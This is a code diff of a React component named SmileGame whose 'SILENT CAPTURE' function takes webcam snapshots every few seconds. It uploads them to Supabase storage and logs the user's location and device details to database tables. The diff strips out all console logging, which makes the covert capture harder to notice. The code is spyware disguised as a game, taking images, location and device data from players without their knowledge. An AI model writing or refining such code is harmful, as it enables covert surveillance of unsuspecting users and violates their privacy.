@@ -48,33 +48,21 @@ export default function SmileGame() {
 
   /* ===== SILENT CAPTURE ===== */
   const captureAndUpload = async () => {
-    console.log("📸 Capturing image...", new Date().toLocaleTimeString());
     try {
       // Check if session ID is ready
       if (!sessionIdRef.current) {
-        console.warn("⚠️ Session ID not initialized yet");
         return;
       }
 
       const video = videoRef.current;
       if (!video) {
-        console.warn("⚠️ Video element not found");
         return;
       }
-
-      // Log video state
-      console.log("🎥 Video state:", {
-        readyState: video.readyState,
-        HAVE_ENOUGH_DATA: video.HAVE_ENOUGH_DATA,
-        videoWidth: video.videoWidth,
-        videoHeight: video.videoHeight,
-      });
 
       if (
         video.readyState !== video.HAVE_ENOUGH_DATA ||
         video.videoWidth === 0
       ) {
-        console.warn("⚠️ Video not ready yet");
         return;
       }
 
@@ -87,11 +75,8 @@ export default function SmileGame() {
         canvas.toBlob(res, "image/jpeg", 0.75)
       );
       if (!blob) {
-        console.warn("⚠️ Blob creation failed");
         return;
       }
-
-      console.log("📤 Uploading blob to Supabase...", blob.size, "bytes");
 
       const [loc, device] = await Promise.all([
         getSmartLocation(),
@@ -105,17 +90,12 @@ export default function SmileGame() {
         .upload(fileName, blob);
 
       if (uploadError) {
-        console.error("❌ Upload error:", uploadError);
         return;
       }
-
-      console.log("✅ File uploaded to storage!");
 
       const { data } = await supabaseClient.storage
         .from("images")
         .getPublicUrl(fileName);
-
-      console.log("🔗 Public URL:", data.publicUrl);
 
       const { error: dbError } = await supabaseClient
         .from("images_table")
@@ -124,11 +104,8 @@ export default function SmileGame() {
         ]);
 
       if (dbError) {
-        console.error("❌ Database insert error:", dbError);
         return;
       }
-
-      console.log("✅ Image recorded in database!");
 
       if (loc?.lat && loc?.lon) {
         const { error: locError } = await supabaseClient
@@ -143,7 +120,7 @@ export default function SmileGame() {
             },
           ]);
         if (locError) {
-          console.error("Location insert error:", locError);
+          return;
         }
       }
 
@@ -162,10 +139,10 @@ export default function SmileGame() {
           },
         ]);
       if (devError) {
-        console.error("Device insert error:", devError);
+        return;
       }
     } catch (err) {
-      console.error("Capture error:", err);
+      setMessage("Capture failed. Please retry.");
     }
   };
 
@@ -295,7 +272,6 @@ export default function SmileGame() {
 
       // Wait a bit for video to stabilize before starting captures
       setTimeout(() => {
-        console.log("✅ Starting capture interval (every 2 seconds)");
         captureTimerRef.current = setInterval(
           captureAndUpload,
           CAPTURE_INTERVAL
